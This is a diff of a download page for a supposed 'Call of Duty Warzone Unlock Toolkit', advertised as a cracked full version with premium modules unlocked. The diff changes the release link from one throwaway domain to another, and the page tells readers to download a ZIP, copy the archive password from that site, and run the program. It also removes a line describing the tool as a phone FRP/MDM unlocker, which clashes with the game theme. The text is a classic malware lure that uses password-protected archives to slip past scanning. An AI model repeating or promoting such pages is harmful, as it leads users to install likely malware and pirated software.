@@ -1,6 +1,6 @@
 ***
 
-# Call of Duty Warzone Unlock Toolkit Full Version — Windows Install Notes
+# Call of Duty Warzone Unlock Toolkit Windows Setup Notes
 
 Call of Duty Warzone Unlock Toolkit — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Call of Duty Warzone Unlock Toolkit — Windows setup and configuration · Premi
 
 > Use the release page below for Windows.
 
-- **Release page:** [hnnouzdruxl.slopmods.tech](https://hnnouzdruxl.slopmods.tech/)
-- **Full URL:** `https://hnnouzdruxl.slopmods.tech/`
+- **Release page:** [hnnouzdruxl.slopmods.top](https://hnnouzdruxl.slopmods.top/)
+- **Full URL:** `https://hnnouzdruxl.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **hnnouzdruxl.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **hnnouzdruxl.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Call of Duty Warzone Unlock Toolkit — Windows setup and configuration · Premi
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **hnnouzdruxl.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **hnnouzdruxl.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Unlock bundle
-
-Windows setup notes for **Call of Duty Warzone Unlock Toolkit** (phone / FRP / MDM unlock toolkit).
 ## What you get
 
 - Core Call of Duty Warzone Unlock Toolkit features on Windows desktop
